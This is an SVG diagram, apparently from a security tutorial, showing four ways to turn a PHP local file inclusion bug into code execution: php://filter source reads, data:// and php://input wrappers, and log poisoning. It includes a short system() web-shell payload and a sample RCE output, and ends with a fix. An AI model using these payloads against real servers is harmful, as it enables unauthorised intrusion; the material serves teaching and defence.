<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 440" font-family="'Chakra Petch','Segoe UI',Arial,sans-serif">
  <rect x="0" y="0" width="800" height="440" rx="12" fill="#0d121d" stroke="#263451"/>
  <text x="400" y="34" text-anchor="middle" font-size="17" font-weight="700" fill="#e3fffa">Turning LFI into RCE</text>
  <text x="400" y="56" text-anchor="middle" font-size="12" fill="#6c7b93" font-family="'JetBrains Mono',monospace">include() runs any PHP it loads, so feed it PHP you control</text>

  <defs>
    <marker id="a" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
      <path d="M0,0 L7,3 L0,6 z" fill="#6c7b93"/>
    </marker>
  </defs>

  <!-- central sink -->
  <g text-anchor="middle">
    <rect x="300" y="190" width="200" height="60" rx="7" fill="#111827" stroke="#ff2a6d"/>
    <text x="400" y="214" fill="#ff2a6d" font-weight="700" font-size="13">The sink</text>
    <text x="400" y="235" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="11">include($_GET['page'])</text>
  </g>

  <!-- four roads -->
  <g font-size="11" font-family="'JetBrains Mono',monospace">
    <rect x="40" y="86" width="310" height="54" rx="7" fill="#0b1518" stroke="#00f0ff" stroke-dasharray="5 4"/>
    <text x="56" y="108" fill="#00f0ff" font-size="11.5" font-family="'Chakra Petch','Segoe UI',Arial,sans-serif">php://filter  (needs nothing)</text>
    <text x="56" y="128" fill="#9fb0c8">convert.base64-encode/resource=index.php</text>

    <rect x="40" y="152" width="310" height="54" rx="7" fill="#0b1518" stroke="#fcee0a" stroke-dasharray="5 4"/>
    <text x="56" y="174" fill="#fcee0a" font-size="11.5" font-family="'Chakra Petch','Segoe UI',Arial,sans-serif">data://  (needs allow_url_include)</text>
    <text x="56" y="194" fill="#9fb0c8">data://text/plain;base64,PD9waHA...&amp;c=id</text>

    <rect x="40" y="248" width="310" height="54" rx="7" fill="#0b1518" stroke="#fcee0a" stroke-dasharray="5 4"/>
    <text x="56" y="270" fill="#fcee0a" font-size="11.5" font-family="'Chakra Petch','Segoe UI',Arial,sans-serif">php://input  (needs allow_url_include)</text>
    <text x="56" y="290" fill="#9fb0c8">POST body: &lt;?php system($_GET['c']); ?&gt;</text>

    <rect x="40" y="314" width="310" height="54" rx="7" fill="#0b1518" stroke="#ff2a6d" stroke-dasharray="5 4"/>
    <text x="56" y="336" fill="#ff2a6d" font-size="11.5" font-family="'Chakra Petch','Segoe UI',Arial,sans-serif">log poisoning  (always works)</text>
    <text x="56" y="356" fill="#9fb0c8">UA: &lt;?php...?&gt;  then page=access.log</text>
  </g>

  <g stroke="#6c7b93" stroke-width="2" marker-end="url(#a)" fill="none">
    <line x1="350" y1="113" x2="330" y2="188"/>
    <line x1="350" y1="179" x2="298" y2="210"/>
    <line x1="350" y1="275" x2="298" y2="230"/>
    <line x1="350" y1="341" x2="330" y2="252"/>
  </g>

  <!-- outcomes -->
  <g text-anchor="middle" font-size="11.5">
    <rect x="556" y="150" width="216" height="46" rx="7" fill="#111827" stroke="#00f0ff"/>
    <text x="664" y="170" fill="#e3fffa">Source code (base64)</text>
    <text x="664" y="187" fill="#9fb0c8" font-size="10">recon step, do this first</text>

    <rect x="556" y="244" width="216" height="46" rx="7" fill="#111827" stroke="#fcee0a"/>
    <text x="664" y="264" fill="#e3fffa">RCE</text>
    <text x="664" y="281" fill="#fcee0a" font-family="'JetBrains Mono',monospace" font-size="10">uid=1000(haipanda)</text>
  </g>
  <line x1="500" y1="205" x2="552" y2="178" stroke="#6c7b93" stroke-width="2" marker-end="url(#a)"/>
  <line x1="500" y1="235" x2="552" y2="262" stroke="#6c7b93" stroke-width="2" marker-end="url(#a)"/>

  <text x="400" y="406" text-anchor="middle" font-size="11" fill="#6c7b93">php://filter reads the source without executing; the other three load attacker PHP that include() then runs.</text>
  <text x="400" y="428" text-anchor="middle" font-size="11" fill="#6c7b93">Fix: never include from input; map a fixed allowlist, and turn off allow_url_include and allow_url_fopen.</text>
</svg>
